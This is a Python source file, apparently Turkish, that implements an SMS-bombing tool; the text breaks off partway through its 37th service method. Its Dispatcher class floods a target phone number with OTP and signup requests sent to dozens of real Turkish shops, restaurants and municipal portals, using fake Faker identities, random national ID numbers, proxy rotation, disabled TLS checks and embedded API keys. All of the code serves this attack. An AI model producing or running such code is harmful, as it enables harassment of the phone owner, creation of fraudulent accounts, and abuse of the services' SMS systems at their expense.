import requests
from faker import Faker
from core.stealth import StealthConfig, stealth_ayarla, STEALTH_FULL

from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style


class Dispatcher():
    adet = 0
    
    def __init__(self, phone, mail):
        self.fake = Faker("tr_TR")
        self.stealth_config = StealthConfig.from_level(STEALTH_FULL)
        self.randomize()

        self.phone = str(phone)
        if mail and len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(randint(10,20)))+"@gmail.com"

    def _get_json(self, response):
        """Safely parse JSON from a response object."""
        try:
            return response.json()
        except Exception:
            return {}

    def randomize(self):
        """Update worker context with fresh identity and session data."""
        self.f_ad = self.fake.first_name().replace("'", "").replace('"', "")
        self.f_soyad = self.fake.last_name().replace("'", "").replace('"', "")
        # Password: Complex, varied length
        self.f_sifre = self.fake.password(length=randint(8, 14), special_chars=True, digits=True, upper_case=True, lower_case=True)
        # Dates and ages
        dob = self.fake.date_of_birth(minimum_age=18, maximum_age=65)
        self.f_birth = dob.strftime("%Y-%m-%d")
        self.f_birth_dot = dob.strftime("%d.%m.%Y")
        self.f_birth_year = dob.year
        self.f_birth_month = dob.month
        self.f_birth_day = dob.day
        # Stealth rotation
        self.headers_pool, self.proxies, self.session, self.engine = stealth_ayarla(self.stealth_config)

    def _srv_01(self):    
        try:    
            self.randomize()    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"Accept": "application/json, text/plain, */*", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = self.session.post(url, headers=headers, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("processStatus") == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 01 [kahvedunyasi.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 01 [kahvedunyasi.com]: {self.phone} ({e})")

    def _srv_02(self):
        try:
            self.randomize()
            url = "https://www.wmf.com.tr/users/register/"
            data={"confirm": "true", "date_of_birth": self.f_birth, "email": self.mail, "email_allowed": "true", "first_name": self.f_ad, "gender": "male", "last_name": self.f_soyad, "password": self.f_sifre, "phone": f"0{self.phone}"}
            wmf = self.session.post(url, data=data, timeout=8, proxies=self.proxies)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 02 [wmf.com.tr]: {self.phone} (OK)")
                self.adet += 1   
            else: raise Exception(f"S:{wmf.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 02 [wmf.com.tr]: {self.phone} ({e})")

    def _srv_03(self):
        try:
            self.randomize()
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            bim = self.session.post(url,  json={"phone": self.phone}, timeout=8, proxies=self.proxies)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 03 [bim.net]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{bim.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 03 [bim.net]: {self.phone} ({e})")

    def _srv_04(self):
        try:
            self.randomize()
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            json={"Phone": self.phone, "XID": ""}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 04 [englishhome.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 04 [englishhome.com]: {self.phone} ({e})")

    def _srv_05(self):
        try:
            self.randomize()
            url = "https://suiste.com:443/api/auth/code"
            headers = {"X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone"}
            data = {"action": "register", "full_name": f"{self.f_ad} {self.f_soyad}", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": self.f_sifre}
            r = self.session.post(url, headers=headers, data=data, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("code") == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 05 [suiste.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 05 [suiste.com]: {self.phone} ({e})")

    def _srv_06(self):
        try:
            self.randomize()
            r = self.session.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 06 [kimgb.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 06 [kimgb.com]: {self.phone} ({e})")

    def _srv_07(self):
        try:
            self.randomize()
            url = "https://www.evidea.com:443/users/register/"
            bound = self.fake.sha256()[:16]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}", "X-App-Type": "akinon-mobile"}
            data = f"--{bound}\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\n{self.f_ad}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\n{self.f_soyad}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n{self.f_sifre}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, proxies=self.proxies)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 07 [evidea.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 07 [evidea.com]: {self.phone} ({e})") 

    def _srv_08(self):
        try:
            self.randomize()
            url = "https://api.345dijital.com:443/api/users/register"
            json={"email": "", "name": self.f_ad, "phoneNumber": f"+90{self.phone}", "surname": self.f_soyad}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            r_json = self._get_json(r)
            if "error" in r_json and r_json["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 08 [345dijital.com]: {self.phone} (EXISTS)")
            else:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 08 [345dijital.com]: {self.phone} (OK)")
                self.adet += 1
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 08 [345dijital.com]: {self.phone} ({e})")

    def _srv_09(self):
        try:
            self.randomize()
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": self.fake.uuid4(), "deviceUniqueId": self.fake.uuid4().upper(), "phone": f"+90{self.phone}"}}
            r = self.session.post(url, headers=headers, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("data", {}).get("generateOtp") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 09 [tiklagelsin.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 09 [tiklagelsin.com]: {self.phone} ({e})")

    def _srv_10(self):
        try:
            self.randomize()
            url = f"https://api.naosstars.com:443/api/smsSend/{self.fake.uuid4()}"
            headers = {"Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = self.session.post(url, headers=headers, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 10 [naosstars.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 10 [naosstars.com]: {self.phone} ({e})")

    def _srv_11(self):
        try:
            self.randomize()
            url = "https://www.koton.com:443/users/register/"
            bound = self.fake.sha256()[:20]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}", "X-App-Type": "akinon-mobile"}
            data = f"--{bound}\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\n{self.f_ad}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\n{self.f_soyad}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n{self.f_sifre}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--{bound}\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--{bound}\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n{self.f_birth}\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, proxies=self.proxies)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 11 [koton.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 11 [koton.com]: {self.phone} ({e})")

    def _srv_12(self):
        try:
            self.randomize()
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = self.session.post(url, data=data, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("is_success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 12 [hayatsu.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 12 [hayatsu.com.tr]: {self.phone} ({e})")

    def _srv_13(self):
        try:
            self.randomize()
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = self.session.post(url, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 13 [hizliecza.net]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 13 [hizliecza.net]: {self.phone} ({e})")

    def _srv_14(self):
        try:
            self.randomize()
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 14 [metro-tr.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 14 [metro-tr.com]: {self.phone} ({e})")

    def _srv_15(self):
        try:
            self.randomize()
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"X-Os": "IOS", "X-Version": "1.7"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = self.session.post(url, headers=headers, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("responseType") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 15 [filemarket.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 15 [filemarket.com.tr]: {self.phone} ({e})")
            
    def _srv_16(self):
        try:
            self.randomize()
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            json={"phone": self.phone}
            r = self.session.post(url=url, json=json, timeout=8, proxies=self.proxies)
            if "succesfully" in r.text.lower():
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 16 [akasya.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 16 [akasya.com.tr]: {self.phone} ({e})")
        
    def _srv_17(self):
        try:
            self.randomize()
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            json={"phone": self.phone}
            r = self.session.post(url=url, json=json, timeout=8, proxies=self.proxies)
            if "succesfully" in r.text.lower():
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 17 [akbati.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 17 [akbati.com.tr]: {self.phone} ({e})")
        
    def _srv_18(self):
        try:
            self.randomize()
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json={"FirmaId": 32, "Telefon": self.phone}
            r = self.session.post(url=url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 18 [komagene.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 18 [komagene.com.tr]: {self.phone} ({e})")

    def _srv_19(self):
        try:
            self.randomize()
            url = "https://panel.porty.tech:443/api.php?"
            json={"job": "start_login", "phone": self.phone}
            r = self.session.post(url=url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("status")== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 19 [porty.tech]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Err")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 19 [porty.tech]: {self.phone} ({e})")
    
    def _srv_20(self):
        try:
            self.randomize()
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            json={"phone": self.phone}
            r = self.session.post(url=url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("result")== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 20 [tasdelen.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 20 [tasdelen.com]: {self.phone} ({e})")

    def _srv_21(self):
        try:
            self.randomize()
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            json={"phone_number": self.phone}
            r = self.session.post(url, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 21 [uysalmarket.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 21 [uysalmarket.com.tr]: {self.phone} ({e})")
    
    def _srv_22(self):
        try:
            self.randomize()
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.5", "code": "tr", "device_name": self.f_ad, "email": self.mail, "firstname": self.f_ad, "lastname": self.f_soyad, "phone_number": self.phone}
            r = self.session.post(url=url, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 22 [yapp.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 22 [yapp.com.tr]: {self.phone} ({e})")
    
    def _srv_23(self):
        try:
            self.randomize()
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            bound = self.fake.sha256()[:12]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}"}
            data = f"--{bound}\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--{bound}\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 23 [buyursungelsin.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 23 [buyursungelsin.com]: {self.phone} ({e})")
    
    def _srv_24(self):
        try:
            self.randomize()
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": self.f_ad, "language": "tr", "lastName": self.f_soyad, "password": self.f_sifre, "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            self.session.post(url, json=json, timeout=4, proxies=self.proxies)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = self.session.post(url, json=json, timeout=4, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 24 [beefull.io]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 24 [beefull.io]: {self.phone} ({e})")

    def _srv_25(self):
        try:
            self.randomize()
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Device-Info": f"Unique-Info: {self.fake.uuid4().upper()} Model: iPhone {randint(11,15)}"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = self.session.post(url, headers=headers, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("isSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 25 [dominos.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 25 [dominos.com.tr]: {self.phone} ({e})")

    def _srv_26(self):
        try:
            self.randomize()
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            json={"AreaCode": 90, "City": "ADANA", "DeviceId": self.fake.uuid4().upper(), "Email": self.mail, "Name": self.f_ad, "Password": self.f_sifre, "PhoneNumber": self.phone, "Surname": self.f_soyad}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("Control") == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 26 [baydoner.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 26 [baydoner.com]: {self.phone} ({e})")

    def _srv_27(self):
        try:
            self.randomize()
            url = "https://restashop.azurewebsites.net:443/graphql/"
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 27 [pidem.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 27 [pidem.com.tr]: {self.phone} ({e})")

    def _srv_28(self):
        try:
            self.randomize()
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            json={"areaCode": "90", "etkContract": True, "phoneNumber": "90"+self.phone}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("processStatus") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 28 [frink.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 28 [frink.com.tr]: {self.phone} ({e})")

    def _srv_29(self):
        try:
            self.randomize()
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = self.session.post(url, headers=headers, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 29 [bodrum.bel.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 29 [bodrum.bel.tr]: {self.phone} ({e})")     

    def _srv_30(self):
        try:
            self.randomize()
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            json={"FireBaseCihazKey": None, "FirmaId": 82, "Telefon": self.phone}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 30 [kofteciyusuf.com]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 30 [kofteciyusuf.com]: {self.phone} ({e})")

    def _srv_31(self):
        try:
            self.randomize()
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            json={"Email": self.mail, "NameSurname": f"{self.f_ad} {self.f_soyad}", "Password": self.f_sifre, "Phone": self.phone}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("status") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 31 [littlecaesars.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 31 [littlecaesars.com.tr]: {self.phone} ({e})")

    def _srv_32(self):
        try:
            self.randomize()
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg"}
            json={"gsm": f"+90{self.phone}", "source": "orwi"}
            r = self.session.post(url, headers=headers, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 32 [orwi.app]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 32 [orwi.app]: {self.phone} ({e})")

    def _srv_33(self):
        try:
            self.randomize()
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            json={"countryCode": "90", "gsm": self.phone, "name": f"{self.f_ad} {self.f_soyad}"}
            r = self.session.post(url, json=json, timeout=8, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 33 [coffy.com.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 33 [coffy.com.tr]: {self.phone} ({e})")

    def _srv_34(self):
        try:
            self.randomize()
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            json={"isGuest": False, "phone": self.phone}
            r = self.session.post(url, json=json, timeout=10, proxies=self.proxies)
            if self._get_json(r).get("result") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 34 [hamidiye.istanbul]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception("Retry")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 34 [hamidiye.istanbul]: {self.phone} ({e})")

    def _srv_35(self):
        try:
            self.randomize()
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            bound = self.fake.sha256()[:16]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}"}
            # Mandatory fields for municipality APIs - using random string to avoid valid ID validation while satisfying 'required'
            tc_dummy = "".join([str(randint(0, 9)) for _ in range(11)])
            data = f"--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{tc_dummy}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n{self.f_birth_dot}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\n{self.f_ad}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\n{self.f_soyad}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\n{self.f_sifre}\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, verify=False, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 35 [fatih.bel.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 35 [fatih.bel.tr]: {self.phone} ({e})")

    def _srv_36(self):
        try:
            self.randomize()
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            bound = self.fake.sha256()[:16]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}"}
            tc_dummy = "".join([str(randint(0, 9)) for _ in range(11)])
            data = f"--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{tc_dummy}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n{self.f_birth_dot}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\n{self.f_ad.upper()}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\n{self.f_soyad.upper()}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n--{bound}\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\n{self.f_sifre}\r\n--{bound}--\r\n"
            r = self.session.post(url, headers=headers, data=data, timeout=8, verify=False, proxies=self.proxies)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Node 36 [sancaktepe.bel.tr]: {self.phone} (OK)")
                self.adet += 1
            else: raise Exception(f"S:{r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Node 36 [sancaktepe.bel.tr]: {self.phone} ({e})")

    def _srv_37(self):
        try:
            self.randomize()
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            bound = self.fake.sha256()[:16]
            headers = {"Content-Type": f"multipart/form-data; boundary={bound}"}
            tc_dummy = "".join([str(randint(0, 9)) for _ in range(11)])
